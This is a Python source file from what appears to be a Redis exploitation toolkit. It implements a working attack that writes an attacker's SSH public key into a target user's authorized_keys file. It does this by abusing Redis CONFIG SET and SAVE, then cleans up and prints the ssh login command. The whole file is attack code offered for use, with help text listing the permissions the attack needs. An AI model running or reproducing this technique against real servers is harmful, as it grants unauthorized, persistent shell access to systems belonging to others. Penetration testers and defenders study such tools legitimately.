from redis.exceptions import ResponseError
from .common import get_assume_defaults_value
from .utils import do_post_attack_restoration, generate_rsa_keys, get_hostname
from .common import read_file



def ssh_help():
    return "\nUse this technique to gain a shell session by\n" \
    "creating an `authorized_keys` file containing\n" \
    "attacker's public keys using the RDB file save\n" \
    "technique.\n\n" \
    "Some important points to note here would be:\n" \
    "1. The attacker MUST have permissions to issue\n" \
    "the following commands:\n" \
    "    i. SET\n" \
    "   ii. CONFIG SET\n" \
    "  iii. SAVE\n" \
    "   iv. FLUSHALL (or FLUSHDB)\n" \
    "2. The user running redis-server must have\n" \
    "permissions to write to the SSH folder of\n" \
    "the user you wish to attack!\n" \
    "3. It must be implied but stating for\n" \
    "completeness - SSH must be running on the\n" \
    "target server.\n"



def ssh(pipeline, dir):

    pub_key_file = None

    assume_defaults = get_assume_defaults_value()

    if not assume_defaults:
        pub_key_file = input("\nProvide your public key file (press enter if you wish to generate keys on the fly): ")

    if not pub_key_file:
        keys_dir = "/tmp/keys"

        if not assume_defaults:
            keys_dir = input("\nIn which folder do you wish to store the keys? (default='/tmp/keys'): ") or keys_dir

        generate_rsa_keys(keys_dir)
        pub_key_file = f"{keys_dir}/public.key"


    pub_key = read_file(pub_key_file)

    username = None

    if not assume_defaults:
        username = input("\nProvide the user you wish to compromise: (default: redis) ")

    # Add our public key to the set of authorized SSH keys
    pipeline.set("hacker_key", f"\n\n{pub_key}\n\n")

    if username:
        pipeline.config_set("dir", f"/home/{username}/.ssh")

    else:
        pipeline.config_set("dir", "/var/lib/redis/.ssh")

    pipeline.config_set("dbfilename", "authorized_keys")
    pipeline.save()

    if not username:
        # Saving the key in both /home/redis/.ssh & /var/lib/redis/.ssh/
        pipeline.config_set("dir", "/home/redis/.ssh")
        pipeline.save()

    try:
        pipeline.execute()
    except ResponseError as e:
        print ("\n[-] Error:", str(e), "\n")
        if "Permission denied" in str(e):
            # Got some issue with permissions...
            print (str(e))

            if username:
                print ("Exploit failed with the specified user!\n")
            else:
                print ("Exploit failed with the default user!\n")

        do_post_attack_restoration(pipeline, "hacker_key", dir)

        return

    # Do some restoration work as well...
    do_post_attack_restoration(pipeline, "hacker_key", dir)

    print ("\nAnd by now you should have SSH access!\n")
    print ("Run this command to confirm:")

    hostname = get_hostname(pipeline)

    priv_key_file = f"{keys_dir}/private.key"

    if username:
        print (f"ssh -i {priv_key_file} {username}@{hostname}")
    else:
        print (f"ssh -i {priv_key_file} redis@{hostname}")
    
    print ()